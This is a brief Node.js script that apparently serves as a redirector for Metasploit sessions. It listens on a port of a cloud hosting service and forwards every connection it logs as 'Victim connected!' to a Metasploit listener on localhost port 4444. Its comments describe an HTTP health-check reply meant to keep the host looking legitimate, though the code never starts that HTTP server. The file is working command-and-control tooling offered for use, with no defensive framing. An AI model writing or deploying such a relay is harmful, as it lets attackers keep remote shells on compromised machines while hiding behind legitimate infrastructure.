const net = require('net');
const http = require('http');

// Render uses a dynamic port provided via process.env.PORT
const PORT = process.env.PORT || 10000;

// HTTP Server for Render Health Check and Monitoring
const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

// TCP Proxy Server to forward traffic to Metasploit
const tcpServer = net.createServer((socket) => {
    console.log('Victim connected!');
    // Forwarding to your local Metasploit listener on port 4444
    const client = net.createConnection({ port: 4444, host: 'localhost' });
    
    socket.pipe(client);
    client.pipe(socket);
    
    socket.on('error', (e) => console.log('Socket Error:', e.message));
    client.on('error', (e) => console.log('Client Error:', e.message));
});

// Using the same port for both ensures Render remains 'Live'
tcpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server is live on port ${PORT}`);
});
